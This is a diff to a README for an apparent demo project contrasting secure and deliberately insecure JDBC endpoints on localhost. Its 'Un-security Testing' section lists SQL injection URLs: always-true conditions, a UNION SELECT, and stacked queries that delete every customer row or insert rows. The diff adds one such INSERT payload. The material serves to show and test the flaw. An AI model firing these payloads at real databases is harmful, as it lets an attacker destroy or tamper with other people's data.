@@ -1,4 +1,6 @@
 # Security Testing
+## JDBC Update
+- http://localhost:8086/jdbc/security/update?id=c-1
 ## JDBC Single
 - http://localhost:8086/jdbc/security/single?id=c-1
 ## JDBC List
@@ -9,6 +11,8 @@
 - http://localhost:8086/template/security/list?title=DEV
 
 # Un-security Testing
+## JDBC Update
+- http://localhost:8086/jdbc/un-security/update?id=c-1';INSERT INTO CUSTOMER(ID, NAME, TITLE) VALUES ('c-8','Roc','QA')-- ;[allowMultiQueries=true]
 ## JDBC Single
 - http://localhost:8086/jdbc/un-security/single?id=c-1' AND 'a'='a
 - http://localhost:8086/jdbc/un-security/single?id=c-1' OR 1=1 LIMIT 3,1-- ;
@@ -20,7 +24,7 @@
 - http://localhost:8086/jdbc/un-security/list?title=NOO' LIMIT 0,100 -- ;
 - http://localhost:8086/jdbc/un-security/list?title=DEV' UNION SELECT * FROM PRODUCT-- ;
 - http://localhost:8086/jdbc/un-security/list?title=DEV';DELETE FROM CUSTOMER-- ;[allowMultiQueries=true]
-- http://localhost:8086/jdbc/un-security/list?title=DEV';INSERT INTO CUSTOMER(ID, NAME, TITLE) VALUES ('c-7','Andy','QA')-- ;[allowMultiQueries=true]
+- http://localhost:8086/jdbc/un-security/list?title=DEV';INSERT INTO CUSTOMER(ID, NAME, TITLE) VALUES ('c-7','Ady','QA')-- ;[allowMultiQueries=true]
 - http://localhost:8086/jdbc/un-security/list?title=DEV';INSERT INTO PRODUCT(ID, NAME, TITLE) VALUES ('p-7','Vivo X200','Phone')-- ;[allowMultiQueries=true]
 
 # How to execute multiple queries in a single statement in java
